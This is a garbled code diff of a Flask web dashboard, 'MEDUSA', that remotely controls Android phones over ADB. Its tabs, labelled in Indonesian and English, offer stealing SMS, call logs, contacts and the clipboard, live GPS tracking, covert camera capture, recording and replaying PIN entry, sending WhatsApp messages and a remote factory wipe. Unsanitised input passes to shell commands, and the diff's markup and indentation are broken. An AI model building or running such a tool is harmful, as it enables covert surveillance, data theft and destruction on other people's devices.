@@ -1,5 +1,5 @@
 # =====================================================================
-# BAGIAN 1 DARI 3: PROFESSIONAL CYBER-OPS INTERFACE (LAYOUT & NEON CSS)
+# BAGIAN 1 DARI 2: MEDUSA ULTRA-COMPACT WORKSPACE ENGINE (100vh MATRIX)
 # =====================================================================
 import os
 import re
@@ -21,7 +21,7 @@ CONNECTED_DEVICES = {}
 ACTIVE_DEVICE_SERIAL = None
 ADB_PATH = "adb"
 
-# --- MEDUSA RENDER CORE: PROFESSIONAL DARK NEON WORKSPACE ---
+# --- THEME COPIED FROM TKINTER: SINGLE-SCREEN VIEWPORT LAYOUT ---
 DASHBOARD_HTML = """
 <!DOCTYPE html>
 <html lang="en">
@@ -32,21 +32,21 @@ DASHBOARD_HTML = """
     <link href="https://jsdelivr.net" rel="stylesheet">
     <link href="https://googleapis.com" rel="stylesheet">
     <style>
-        /* Welcome Overlay Smooth Transition */
+        /* Welcome Overlay */
         #welcome-overlay {
             position: fixed; top: 0; left: 0; width: 100%; height: 100%;
             background-color: #050505; z-index: 9999; display: flex;
             flex-direction: column; justify-content: center; align-items: center;
-            transition: opacity 0.5s ease-out;
+            transition: opacity 0.4s ease-out;
         }
         .welcome-box {
-            border: 1px solid #FF0000; padding: 40px; border-radius: 4px;
-            background-color: #0d0d0d; text-align: center; width: 450px;
+            border: 1px solid #FF0000; padding: 30px; border-radius: 4px;
+            background-color: #0d0d0d; text-align: center; width: 400px;
             box-shadow: 0 0 25px rgba(255, 0, 0, 0.15);
         }
         .progress-bar-loading {
             width: 100%; height: 2px; background-color: #1a1a1a;
-            margin-top: 25px; position: relative; overflow: hidden;
+            margin-top: 20px; position: relative; overflow: hidden;
         }
         .progress-bar-loading::after {
             content: ''; position: absolute; width: 80px; height: 100%;
@@ -55,269 +55,227 @@ DASHBOARD_HTML = """
         }
         @keyframes loading { 0% { left: -80px; } 100% { left: 100%; } }
 
-        /* Master Workspace Frame */
-        body { background-color: #050505; color: #00FF00; font-family: 'Fira Code', monospace; font-size: 13px; }
-        .wrapper { display: flex; min-height: 100vh; }
+        /* Kunci Tinggi Satu Layar (Anti-Scroll) */
+        html, body, .wrapper { height: 100vh; overflow: hidden; margin: 0; padding: 0; }
+        body { background-color: #050505; color: #00FF00; font-family: 'Fira Code', monospace; font-size: 12px; }
+        .wrapper { display: flex; width: 100%; }
         
-        /* Sidebar System Profile */
-        .sidebar { width: 300px; background-color: #0a0a0a; border-right: 1px solid #222; padding: 25px 20px; display: flex; flex-direction: column; }
-        .system-title { font-weight: 600; letter-spacing: 2px; color: #FF0000; text-shadow: 0 0 8px rgba(255,0,0,0.3); font-size: 16px; }
-        .device-panel { border: 1px solid #333; padding: 15px; border-radius: 4px; background: #0d0d0d; margin-bottom: 20px; }
-        .sidebar-btn { background-color: transparent; color: #aaa; border: 1px solid #333; border-radius: 4px; padding: 10px; font-weight: 600; font-size: 11px; letter-spacing: 1px; transition: all 0.2s ease; width: 100%; margin-bottom: 10px; text-transform: uppercase; }
-        .sidebar-btn:hover { border-color: #FF0000; color: #fff; box-shadow: 0 0 10px rgba(255,0,0,0.2); background: rgba(139,0,0,0.1); }
+        /* Sidebar Menu Layout */
+        .sidebar { width: 280px; background-color: #0a0a0a; border-right: 1px solid #222; padding: 15px; display: flex; flex-direction: column; height: 100%; justify-content: space-between; }
+        .system-title { font-weight: 600; letter-spacing: 1px; color: #FF0000; text-shadow: 0 0 8px rgba(255,0,0,0.3); font-size: 14px; }
+        .device-panel { border: 1px solid #333; padding: 10px; border-radius: 4px; background: #0d0d0d; margin-bottom: 15px; }
+        .sidebar-btn { background-color: transparent; color: #aaa; border: 1px solid #232323; border-radius: 4px; padding: 8px; font-weight: 600; font-size: 11px; transition: all 0.2s; width: 100%; margin-bottom: 6px; text-transform: uppercase; }
+        .sidebar-btn:hover { border-color: #FF0000; color: #fff; background: rgba(139,0,0,0.1); }
         
-        /* Content Panel Layout */
-        .main-panel { flex: 1; padding: 30px; display: flex; flex-direction: column; gap: 20px; }
-        .panel-header { border-bottom: 1px solid #222; padding-bottom: 15px; margin-bottom: 10px; display: flex; justify-content: space-between; align-items: center; }
+        /* Main Matrix Panel Dashboard */
+        .main-panel { flex: 1; padding: 20px; display: flex; flex-direction: column; gap: 15px; height: 100%; }
+        .panel-header { border-bottom: 1px solid #222; padding-bottom: 8px; display: flex; justify-content: space-between; align-items: center; }
         
-        /* Modern Matrix Tabview */
-        .nav-tabs { border-bottom: 1px solid #333; gap: 5px; }
-        .nav-tabs .nav-link { color: #666; background: transparent; border: 1px solid transparent; border-radius: 4px 4px 0 0; padding: 10px 18px; font-weight: 600; transition: all 0.2s; }
-        .nav-tabs .nav-link:hover { color: #00FF00; background: #0d0d0d; border-color: #333 #333 transparent; }
-        .nav-tabs .nav-link.active { color: #fff !important; background-color: #111 !important; border-color: #FF0000 #FF0000 transparent !important; text-shadow: 0 0 5px #FF0000; }
-        .tab-content { background-color: #0a0a0a; border: 1px solid #FF0000; border-radius: 0 4px 4px 4px; padding: 25px; box-shadow: 0 5px 15px rgba(0,0,0,0.5); }
+        /* Compact Tabview Customization */
+        .nav-tabs { border-bottom: 1px solid #333; gap: 3px; }
+        .nav-tabs .nav-link { color: #555; background: transparent; border: 1px solid transparent; border-radius: 4px 4px 0 0; padding: 6px 12px; font-weight: 600; font-size: 11px; }
+        .nav-tabs .nav-link:hover { color: #00FF00; background: #0d0d0d; }
+        .nav-tabs .nav-link.active { color: #fff !important; background-color: #0d0d0d !important; border-color: #FF0000 #FF0000 transparent !important; text-shadow: 0 0 5px #FF0000; }
+        .tab-content { background-color: #0a0a0a; border: 1px solid #FF0000; border-radius: 0 4px 4px 4px; padding: 15px; flex: 1; min-height: 0; overflow-y: auto; }
         
-        /* Command Grid Engine */
-        .grid-btn { background: #0d0d0d; color: #00FF00; border: 1px solid #222; border-radius: 4px; padding: 12px 15px; text-align: left; transition: all 0.2s ease; font-size: 12px; font-weight: 500; display: flex; justify-content: space-between; align-items: center; width: 100%; margin-bottom: 10px; }
-        .grid-btn::after { content: '➔'; color: #333; font-size: 10px; transition: all 0.2s; }
-        .grid-btn:hover { border-color: #00FF00; background: rgba(0,255,0,0.02); box-shadow: 0 0 10px rgba(0,255,0,0.1); }
-        .grid-btn:hover::after { color: #00FF00; transform: translateX(3px); }
+        /* Compact Action Grid Buttons */
+        .grid-btn { background: #0d0d0d; color: #00FF00; border: 1px solid #222; border-radius: 4px; padding: 10px 12px; text-align: left; transition: all 0.15s; font-size: 11px; display: flex; justify-content: space-between; align-items: center; width: 100%; margin-bottom: 8px; }
+        .grid-btn::after { content: '➔'; color: #333; font-size: 9px; }
+        .grid-btn:hover { border-color: #00FF00; background: rgba(0,255,0,0.01); }
+        .grid-btn:hover::after { color: #00FF00; }
         .grid-btn-danger { color: #FF3333; }
-        .grid-btn-danger:hover { border-color: #FF3333; background: rgba(255,51,51,0.02); box-shadow: 0 0 10px rgba(255,51,51,0.1); }
-        .grid-btn-danger:hover::after { color: #FF3333; }
+        .grid-btn-danger:hover { border-color: #FF3333; background: rgba(255,51,51,0.01); }
 
-        /* Terminal Window Console */
-        .console-card { background-color: #0a0a0a; border: 1px solid #222; border-radius: 4px; height: 100%; display: flex; flex-direction: column; overflow: hidden; }
-        .console-header { background: #0d0d0d; border-bottom: 1px solid #222; padding: 10px 15px; font-size: 11px; font-weight: 600; color: #666; letter-spacing: 1px; display: flex; justify-content: space-between; }
-        .log-textbox { background-color: #050505; color: #00FF00; height: 260px; overflow-y: auto; padding: 15px; font-size: 12px; line-height: 1.6; flex: 1; list-style: none; margin: 0; }
+        /* Jendela Console & Monitor Paralel Bawah */
+        .bottom-row { display: flex; gap: 15px; height: 200px; min-height: 200px; }
+        .console-card { background-color: #0a0a0a; border: 1px solid #222; border-radius: 4px; flex: 1; display: flex; flex-direction: column; overflow: hidden; }
+        .console-header { background: #0d0d0d; border-bottom: 1px solid #222; padding: 6px 12px; font-size: 10px; color: #666; font-weight: 600; display: flex; justify-content: space-between; }
+        .log-textbox { background-color: #050505; color: #00FF00; overflow-y: auto; padding: 10px; font-size: 11px; line-height: 1.5; flex: 1; list-style: none; margin: 0; }
         
-        /* Video Stream Projector Box */
-        .stream-box { border: 1px solid #222; background: #000; border-radius: 4px; width: 100%; height: 292px; display: flex; justify-content: center; align-items: center; overflow: hidden; position: relative; }
+        /* Video Stream Projector Box Box */
+        .stream-card { width: 320px; background-color: #0a0a0a; border: 1px solid #222; border-radius: 4px; display: flex; flex-direction: column; overflow: hidden; }
+        .stream-box { background: #000; flex: 1; display: flex; justify-content: center; align-items: center; overflow: hidden; }
         .stream-view { width: 100%; height: 100%; object-fit: contain; }
-        .status-dot { width: 6px; height: 6px; background-color: #00FF00; border-radius: 50%; display: inline-block; margin-right: 6px; box-shadow: 0 0 8px #00FF00; }
+        .status-dot { width: 5px; height: 5px; background-color: #00FF00; border-radius: 50%; display: inline-block; margin-right: 5px; box-shadow: 0 0 6px #00FF00; }
     </style>
 </head>
 <body>
 
-<!-- OVERLAY SCREEN (4 DETIK DELAY SINKRONISASI ASLI) -->
 <div id="welcome-overlay">
     <div class="welcome-box">
-        <div class="system-title mb-2">MEDUSA SYSTEM PROTOCOL</div>
-        <div class="small text-muted" style="font-size: 11px; letter-spacing: 1px;">INITIALIZING CONTROL ROOM MATRIX...</div>
+        <div class="system-title mb-1">MEDUSA SYSTEM ENGINE</div>
+        <div class="small text-muted" style="font-size: 10px; letter-spacing: 1px;">SINKRONISASI VIEWPORT MATRIKS...</div>
         <div class="progress-bar-loading"></div>
     </div>
 </div>
 
 <div class="wrapper">
-    <!-- SIDEBAR UTAMA MURNI -->
+    <!-- SIDEBAR PANEL KONTROL KIRI -->
     <div class="sidebar">
-        <div class="system-title text-center mb-4">MEDUSA MATRIX v1.0</div>
-        
-        <div class="device-panel">
-            <div class="small text-muted mb-2" style="font-size: 10px; font-weight: 600; letter-spacing: 1px;">PROVISIONING TARGET:</div>
-            <select class="form-select bg-black text-success border-secondary small mb-2 shadow-none" id="deviceSelector" onchange="switchDevice(this.value)" style="font-size: 12px;">
-                <option>[ Menunggu Node Terhubung... ]</option>
-            </select>
-            <div class="small text-muted mt-2 border-top border-dark pt-2" id="deviceDetails" style="font-size: 11px; line-height: 1.5;">Detail Node:<br>-</div>
-        </div>
+        <div>
+            <div class="system-title text-center mb-3">MEDUSA MATRIX v1.0</div>
+            
+            <div class="device-panel">
+                <span class="d-block small text-muted mb-1" style="font-size: 9px; font-weight: bold;">NODE DEVICE TARGET:</span>
+                <select class="form-select bg-black text-success border-secondary small mb-1 shadow-none" id="deviceSelector" onchange="switchDevice(this.value)" style="font-size: 11px; padding: 4px 8px;">
+                    <option>[ Menunggu Node... ]</option>
+                </select>
+                <div class="small text-muted mt-1 border-top border-dark pt-1" id="deviceDetails" style="font-size: 10px; line-height: 1.4;">Detail Node:<br>-</div>
+            </div>
 
-        <div class="flex-grow-1">
-            <button class="sidebar-btn" onclick="triggerAction('setup-adb')">Setup Platform Environment</button>
-            <button class="sidebar-btn" onclick="triggerAction('scan-network')" style="color: #00CED1;">Scan Jaringan (WiFi)</button>
-            <button class="sidebar-btn" onclick="triggerAction('connect-qr')" style="color: #20B2AA;">Connect via QR Code</button>
-            <button class="sidebar-btn" onclick="triggerAction('open-loot')" style="color: #228B22;">Explorer ADB_LOOT</button>
-            <button class="sidebar-btn" onclick="triggerAction('manual-pair')">Manual Local Pairing</button>
-            <button class="sidebar-btn" onclick="triggerAction('connect-ip')">Direct Address Injection</button>
-            <button class="sidebar-btn" onclick="triggerAction('switch-tcp')">Switch to Wireless TCP</button>
-        </div>
-        <div class="text-center text-muted mt-3" style="font-size: 9px; letter-spacing: 1px;">SECURE PRIV LAB OPERATOR</div>
-    </div>
-
-    <!-- WORKSPACE UTAMA OPERATOR -->
-    <div class="main-panel">
-        <div class="panel-header">
-            <h4 class="m-0 text-white fw-bold" style="font-size: 15px; letter-spacing: 1px;">// OPERATIONAL RECON ROOM</h4>
-            <div class="small text-muted d-flex align-items-center"><span class="status-dot"></span> LIVE INFRASTRUCTURE CONNECTED</div>
-        </div>
-
-        <div class="row m-0 p-0">
-            <div class="col-12 p-0">
-                <ul class="nav nav-tabs" id="medusaTabs" role="tablist">
-                    <li class="nav-item"><button class="nav-link active" data-bs-toggle="tab" data-bs-target="#intel">Intel & Extraction</button></li>
-                    <li class="nav-item"><button class="nav-link" data-bs-toggle="tab" data-bs-target="#manip">Manipulation</button></li>
-                    <li class="nav-item"><button class="nav-link" data-bs-toggle="tab" data-bs-target="#spam">Spam & Diagnostic</button></li>
-                    <li class="nav-item"><button class="nav-link" data-bs-toggle="tab" data-bs-target="#camera">Camera Media</button></li>
-                    <li class="nav-item"><button class="nav-link" data-bs-toggle="tab" data-bs-target="#media">Multimedia Core</button></li>
-                    <li class="nav-item"><button class="nav-link" data-bs-toggle="tab" data-bs-target="#system">System Core</button></li>
-                </ul>
-                
-                <div class="tab-content" id="medusaTabsContent">
-                    <!-- INTEL TAB -->
-                    <div class="tab-pane fade show active" id="intel">
-                        <div class="row">
-                            <div class="col-md-6"><button class="grid-btn" onclick="triggerAction('sedot-sms')">01 // Backup SMS Database</button></div>
-                            <div class="col-md-6"><button class="grid-btn" onclick="triggerAction('curi-clipboard')">12 // Pull System Clipboard</button></div>
-                            <div class="col-md-6"><button class="grid-btn" onclick="triggerAction('sedot-calls')">02 // Extract Call History Analytics</button></div>
-                            <div class="col-md-6"><button class="grid-btn" onclick="triggerAction('info-baterai')">13 // Query Detail Battery Telemetry</button></div>
-                            <div class="col-md-6"><button class="grid-btn" onclick="triggerAction('sedot-kontak')">03 // Sync Device Contacts Data</button></div>
-                            <div class="col-md-6"><button class="grid-btn" onclick="triggerAction('lokasi-maps')">14 // Fetch Geo Location (Maps)</button></div>
-                            <div class="col-md-6"><button class="grid-btn" onclick="triggerAction('daftar-apps')">05 // Compile Installed Packages</button></div>
-                            <div class="col-md-6"><button class="grid-btn" onclick="triggerAction('lacak-gps')">15 // Track Live Realtime GPS</button></div>
-                        </div>
-                    </div>
-                    
-                    <!-- MANIPULATION TAB -->
-                    <div class="tab-pane fade" id="manip">
-                        <div class="row">
-                            <div class="col-md-6"><button class="grid-btn" onclick="triggerAction('buka-wa')">15 // Force Wake Communication App</button></div>
-                            <div class="col-md-6"><button class="grid-btn" onclick="triggerAction('buka-link')">21 // Deploy Remote URL Resource</button></div>
-                            <div class="col-md-6"><button class="grid-btn" onclick="triggerAction('ketik-wa')">16 // Dispatch Target Message WA</button></div>
-                            <div class="col-md-6"><button class="grid-btn" onclick="triggerAction('putar-musik')">24 // Stream System Remote Audio</button></div>
-                        </div>
-                    </div>
-
-                    <!-- SPAM TAB -->
-                    <div class="tab-pane fade" id="spam">
-                        <div class="row">
-                            <div class="col-md-6"><button class="grid-btn" onclick="triggerAction('kirim-toast')">27 // Broadcast System Overlay Toast</button></div>
-                            <div class="col-md-6"><button class="grid-btn" onclick="triggerAction('mainkan-alarm')">41 // Trigger Audio Diagnostic Alert</button></div>
-                            <div class="col-md-6"><button class="grid-btn" onclick="triggerAction('getar-hp')">28 // Execute Vibration Test (5s)</button></div>
-                            <div class="col-md-6"><button class="grid-btn" onclick="triggerAction('stop-suara')">43 // Hard Mute All Active Streams</button></div>
-                        </div>
-                    </div>
-
-                    <!-- CAMERA TAB -->
-                    <div class="tab-pane fade" id="camera">
-                        <div class="row">
-                            <div class="col-md-6"><button class="grid-btn" onclick="triggerAction('foto-depan')">c1 // Trigger Front Camera Diagnostics</button></div>
-                            <div class="col-md-6"><button class="grid-btn" onclick="triggerAction('rekam-pin')">p1 // Record Device Event Logs (PIN)</button></div>
-                            <div class="col-md-6"><button class="grid-btn" onclick="triggerAction('foto-belakang')">c2 // Trigger Rear Camera Diagnostics</button></div>
-                            <div class="col-md-6"><button class="grid-btn" onclick="triggerAction('replay-pin')">p2 // Replay System Coordinate Path</button></div>
-                        </div>
-                    </div>
-
-                    <!-- MULTIMEDIA TAB -->
-                    <div class="tab-pane fade" id="media">
-                        <div class="row">
-                            <div class="col-md-6"><button class="grid-btn" onclick="triggerAction('screenshot')">25 // Capture Device View Frame</button></div>
-                            <div class="col-md-6"><button class="grid-btn" onclick="triggerAction('mirror-scrcpy')">35 // Deploy Local Mirroring Display</button></div>
-                            <div class="col-md-6"><button class="grid-btn" onclick="triggerAction('screenrecord')">26 // Initialize Video Display Record</button></div>
-                            <div class="col-md-6"><button class="grid-btn" onclick="triggerAction('injeksi-keyboard')">37 // Inject Remote System Key Event</button></div>
-                        </div>
-                    </div>
-
-                    <!-- SYSTEM TAB -->
-                    <div class="tab-pane fade" id="system">
-                        <div class="row">
-                            <div class="col-md-4"><button class="grid-btn text-center" onclick="triggerAction('layar-nyala')">Wake Device Screen</button></div>
-                            <div class="col-md-4"><button class="grid-btn text-center" onclick="triggerAction('reboot')">System Safe Reboot</button></div>
-                            <div class="col-md-4"><button class="grid-btn grid-btn-danger" onclick="triggerAction('power-off')">System Power Down</button></div>
-                            <div class="col-md-12 mt-2"><button class="grid-btn grid-btn-danger text-center justify-content-center" onclick="triggerAction('wipe-data')">CRITICAL // INITIATE COMPREHENSIVE FACTORY RESET</button></div>
-                        </div>
-                    </div>
-                </div>
+            <div class="menu-list">
+                <button class="sidebar-btn" onclick="triggerAction('setup-adb')">Setup Platform Environment</button>
+                <button class="sidebar-btn" onclick="triggerAction('scan-network')" style="color: #00CED1;">Scan Jaringan (WiFi)</button>
+                <button class="sidebar-btn" onclick="triggerAction('connect-qr')" style="color: #20B2AA;">Connect via QR Code</button>
+                <button class="sidebar-btn" onclick="triggerAction('open-loot')" style="color: #228B22;">Explorer ADB_LOOT</button>
+                <button class="sidebar-btn" onclick="triggerAction('manual-pair')">Manual Local Pairing</button>
+                <button class="sidebar-btn" onclick="triggerAction('connect-ip')">Direct IP Injection</button>
+                <button class="sidebar-btn" onclick="triggerAction('switch-tcp')">Switch Wireless TCP</button>
             </div>
         </div>
+        <div class="text-center text-muted" style="font-size: 9px; letter-spacing: 1px;">SECURE PRIV LAB ENGINE</div>
+    </div>
 
-        <!-- CONSOLE TERMINAL & VIDEO FEED PARALEL GRID -->
-        <div class="row m-0 p-0 flex-grow-1 align-items-stretch" style="min-height: 292px;">
-            <div class="col-md-7 ps-0">
-                <div class="console-card">
-                    <div class="console-header"><span>[ SUBSYSTEM TERMINAL OUTPUT ]</span><span id="liveClock">00:00:00</span></div>
-Initializing secure web interface channel listener...
+    <!-- MAIN PANEL DASBOR KANAN -->
+    <div class="main-panel">
+        <div class="panel-header">
+            <h5 class="m-0 text-white fw-bold" style="font-size: 13px; letter-spacing: 1px;">// INTERFACE SINGLE SCREEN CONTROL</h5>
+            <div class="small text-muted d-flex align-items-center" style="font-size: 10px;"><span class="status-dot"></span> INFRASTRUCTURE SECURITY ONLINE</div>
+        </div>
 
-[ REALTIME NODE DIAGNOSTIC STREAM FEED ]
----
+        <!-- AREA TAB GRID AUTOMATION -->
+        <div class="d-flex flex-column flex-grow-1 min-height-0">
+            <ul class="nav nav-tabs" id="medusaTabs" role="tablist">
+                <li class="nav-item"><button class="nav-link active" data-bs-toggle="tab" data-bs-target="#intel">Intel & Extraction</button></li>
+                <li class="nav-item"><button class="nav-link" data-bs-toggle="tab" data-bs-target="#manip">Manipulation</button></li>
+                <li class="nav-item"><button class="nav-link" data-bs-toggle="tab" data-bs-target="#spam">Spam & Diagnostic</button></li>
+                <li class="nav-item"><button class="nav-link" data-bs-toggle="tab" data-bs-target="#camera">Camera Media</button></li>
+                <li class="nav-item"><button class="nav-link" data-bs-toggle="tab" data-bs-target="#media">Multimedia Core</button></li>
+System Core
+01 // Backup SMS Database
+12 // Pull System Clipboard
+02 // Extract Call History Analytics
+13 // Query Detail Battery Telemetry
+03 // Sync Device Contacts Data
+14 // Fetch Geo Location (Maps)
+05 // Compile Installed Packages
+15 // Track Live Realtime GPS
 
-### 📂 Bagian 3 dari 3: Front-End Scripts, API Logic Endpoints, dan Core Server Python (Anti-Potong)
+15 // Force Wake Communication App
+21 // Deploy Remote URL Resource
+16 // Dispatch Target Message WA
+24 // Stream System Remote Audio
 
-Bagian ketiga ini membungkus fungsi sinkronisasi penutupan Welcome Overlay secara halus (*fade out*), jam *live terminal* di pojok kanan console header, serta logika pemrosesan biner Python di belakangnya.
+27 // Broadcast System Overlay Toast
+41 // Trigger Audio Diagnostic Alert
+28 // Execute Vibration Test (5s)
+43 // Hard Mute All Active Streams
 
-```html
-<script>
-    // Smooth transition overlay welcome screen 4 detik
-    setTimeout(() => {
-        let overlay = document.getElementById('welcome-overlay');
-        overlay.style.opacity = '0';
-        setTimeout(() => overlay.style.display = 'none', 500);
-    }, 4000);
+c1 // Trigger Front Camera Diagnostics
+p1 // Record Device Event Logs (PIN)
+c2 // Trigger Rear Camera Diagnostics
+p2 // Replay System Coordinate Path
 
-    // Live operator terminal clock utility
-    setInterval(() => {
-        let d = new Date();
-        document.getElementById('liveClock').innerText = d.toTimeString().split(' ')[0];
-    }, 1000);
+25 // Capture Device View Frame
+35 // Deploy Local Mirroring Display
+26 // Initialize Video Display Record
+37 // Inject Remote System Key Event
 
-    function updateDashboard() {
-        fetch('/api/get-telemetry-log')
-            .then(res => res.json())
-            .then(data => {
-                document.getElementById("logBox").innerHTML = data.logs.join("<br>");
-                let select = document.getElementById("deviceSelector");
-                let current = select.value;
-                select.innerHTML = "";
-                data.devices.forEach(d => {
-                    let opt = document.createElement("option");
-                    opt.value = d; opt.innerText = d;
-                    if(d === data.active) opt.selected = true;
-                    select.appendChild(opt);
-                });
-                document.getElementById("deviceDetails").innerHTML = data.details;
-            });
-        document.getElementById("liveStreamView").src = "/api/get-latest-frame?" + new Date().getTime();
-    }
+Wake Device Screen
+System Safe Reboot
+System Power Down
+CRITICAL // INITIATE FACTORY RESET
 
-    function switchDevice(serial) {
-        fetch('/api/switch-device', {
-            method: 'POST',
-            headers: {'Content-Type': 'application/json'},
-            body: JSON.stringify({serial: serial})
-        });
-    }
 
-    function triggerAction(action) {
-        let value = "";
-        if (action === 'injeksi-keyboard' || action === 'buka-link' || action === 'lokasi-maps' || action === 'ketik-wa') {
-            value = prompt("MEDUSA BUFFER INPUT REQUIRED:");
-            if (!value) return;
-        }
-        fetch('/api/execute-action', {
-            method: 'POST',
-            headers: {'Content-Type': 'application/json'},
-            body: JSON.stringify({action: action, value: value})
-        }).then(res => res.json()).then(data => console.log("// PIPELINE EXEC: " + data.status));
-    }
 
-    setInterval(updateDashboard, 1500);
-    window.onload = updateDashboard;
-</script>
-</body>
-</html>
+[ SUBSYSTEM TERMINAL OUTPUT ]00:00:00
+Initializing secure web interface viewport listener...
+
+
+[ VIDEO TARGET STREAM FEED ]
+
+
+
+
+
+
+setTimeout(() => {
+let overlay = document.getElementById('welcome-overlay');
+overlay.style.opacity = '0';
+setTimeout(() => overlay.style.display = 'none', 400);
+}, 4000);
+setInterval(() => {
+let d = new Date();
+document.getElementById('liveClock').innerText = d.toTimeString().split(' ');
+}, 1000);
+function updateDashboard() {
+fetch('/api/get-telemetry-log')
+.then(res => res.json())
+.then(data => {
+document.getElementById("logBox").innerHTML = data.logs.join("
+");
+let select = document.getElementById("deviceSelector");
+select.innerHTML = "";
+data.devices.forEach(d => {
+let opt = document.createElement("option");
+opt.value = d; opt.innerText = d;
+if(d === data.active) opt.selected = true;
+select.appendChild(opt);
+});
+document.getElementById("deviceDetails").innerHTML = data.details;
+});
+document.getElementById("liveStreamView").src = "/api/get-latest-frame?" + new Date().getTime();
+}
+function switchDevice(serial) {
+fetch('/api/switch-device', {
+method: 'POST',
+headers: {'Content-Type': 'application/json'},
+body: JSON.stringify({serial: serial})
+});
+}
+function triggerAction(action) {
+let value = "";
+if (action === 'injeksi-keyboard' || action === 'buka-link' || action === 'lokasi-maps' || action === 'ketik-wa') {
+value = prompt("MEDUSA BUFFER INPUT REQUIRED:");
+if (!value) return;
+}
+fetch('/api/execute-action', {
+method: 'POST',
+headers: {'Content-Type': 'application/json'},
+body: JSON.stringify({action: action, value: value})
+}).then(res => res.json()).then(data => console.log("// EXEC SYSTEM: OK"));
+}
+setInterval(updateDashboard, 1500);
+window.onload = updateDashboard;
+
+
+
 """
-
 @app.route('/')
 def home():
-    return redirect('/operator/dashboard')
-
+return redirect('/operator/dashboard')
 @app.route('/operator/dashboard')
 def operator_dashboard():
-    return render_template_string(DASHBOARD_HTML)
+return render_template_string(DASHBOARD_HTML)# =====================================================================
+# BAGIAN 2 DARI 2: CORE PIPELINE ENGINE & ADB BACKGROUND DAEMON TRACKER
+# =====================================================================
 
-# --- BACKEND PIPELINE (SINKRON 100% KELUARAN ADB) ---
 @app.route('/api/get-telemetry-log')
 def get_telemetry_log():
     global CONNECTED_DEVICES, ACTIVE_DEVICE_SERIAL
     logs = ["// SYSTEM SECURE ONLINE // CHANNEL READY"]
     if os.path.exists(LOG_FILE):
         with open(LOG_FILE, "r") as f:
-            logs = f.read().splitlines()[-12:]
+            logs = f.read().splitlines()[-10:]  # Menampilkan 10 baris terakhir log
     details = "MANUFACTURER : N/A\\nMODEL ENGINE : N/A\\nOS SUBVERSION: N/A\\nBATTERY SYS  : N/A"
     if ACTIVE_DEVICE_SERIAL and ACTIVE_DEVICE_SERIAL in CONNECTED_DEVICES:
         d = CONNECTED_DEVICES[ACTIVE_DEVICE_SERIAL]
         details = f"PABRIKAN : {d.get('manufacturer')}\\nMODEL    : {d.get('model')}\\nANDROID  : {d.get('android')}\\nBATTERY  : {d.get('battery')}%"
     return jsonify({
-        "logs": logs, "devices": list(CONNECTED_DEVICES.keys()) if CONNECTED_DEVICES else [],
-        "active": ACTIVE_DEVICE_SERIAL, "details": details
+        "logs": logs, 
+        "devices": list(CONNECTED_DEVICES.keys()) if CONNECTED_DEVICES else [],
+        "active": ACTIVE_DEVICE_SERIAL, 
+        "details": details
     })
 
 @app.route('/api/switch-device', methods=['POST'])
@@ -334,9 +292,11 @@ def receive_frame():
     try:
         base64_data = request.data.decode('utf-8')
         if base64_data:
-            with open(FRAME_FILE, "w") as f: f.write(base64_data)
+            with open(FRAME_FILE, "w") as f: 
+                f.write(base64_data)
             return "OK", 200
-    except Exception: pass
+    except Exception: 
+        pass
     return "Failed", 400
 
 @app.route('/api/get-latest-frame')
@@ -349,7 +309,8 @@ def get_latest_frame():
                 try:
                     header, encoded = base64_data.split(",", 1)
                     return base64.b64decode(encoded), 200, {'Content-Type': 'image/jpeg'}
-                except Exception: pass
+                except Exception: 
+                    pass
     import base64
     return base64.b64decode("R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"), 200, {'Content-Type': 'image/gif'}
 
@@ -357,7 +318,8 @@ def get_latest_frame():
 def execute_action():
     global ACTIVE_DEVICE_SERIAL
     data = request.json
-    if not data or 'action' not in data: return jsonify({"status": "error"}), 400
+    if not data or 'action' not in data: 
+        return jsonify({"status": "error"}), 400
     action, val = data['action'], data.get('value', '')
     pfx = f"{ADB_PATH} -s {ACTIVE_DEVICE_SERIAL}" if ACTIVE_DEVICE_SERIAL else ADB_PATH
     cmd = ""
@@ -388,14 +350,17 @@ def execute_action():
     elif action == "reboot": cmd = f"{pfx} reboot"
     elif action == "power-off": cmd = f"{pfx} reboot -p"
     elif action == "wipe-data": cmd = f"{pfx} shell am broadcast -a android.intent.action.MASTER_CLEAR"
-    else: return jsonify({"status": "ignored"})
+    else: 
+        return jsonify({"status": "ignored"})
         
     def run_sub():
         try:
             res = subprocess.run(cmd, shell=True, capture_output=True, text=True, encoding='utf-8', errors='ignore')
             ts = datetime.datetime.now().strftime("%H:%M:%S")
-            with open(LOG_FILE, "a") as f: f.write(f"[{ts}] RECON // {action.upper()} Executed (Code: {res.returncode})\\n")
-        except Exception: pass
+            with open(LOG_FILE, "a") as f: 
+                f.write(f"[{ts}] RECON // {action.upper()} Executed (Code: {res.returncode})\\n")
+        except Exception: 
+            pass
     threading.Thread(target=run_sub, daemon=True).start()
     return jsonify({"status": "success"})
 
@@ -408,7 +373,8 @@ def adb_device_tracker_daemon():
             new_devs = {}
             for s_arr in lines:
                 serial = s_arr[0]
-                if serial in CONNECTED_DEVICES: new_devs[serial] = CONNECTED_DEVICES[serial]
+                if serial in CONNECTED_DEVICES: 
+                    new_devs[serial] = CONNECTED_DEVICES[serial]
                 else:
                     p = f"{ADB_PATH} -s {serial}"
                     mnf = subprocess.run(f"{p} shell getprop ro.product.manufacturer", shell=True, capture_output=True, text=True).stdout.strip().capitalize()
@@ -416,7 +382,8 @@ def adb_device_tracker_daemon():
                     new_devs[serial] = {"manufacturer": mnf if mnf else "NODE", "model": mdl if mdl else "UNKNOWN", "android": "N/A", "battery": "100"}
                     ACTIVE_DEVICE_SERIAL = serial
             CONNECTED_DEVICES = new_devs
-        except Exception: pass
+        except Exception: 
+            pass
         time.sleep(5)
 
 if __name__ == '__main__':
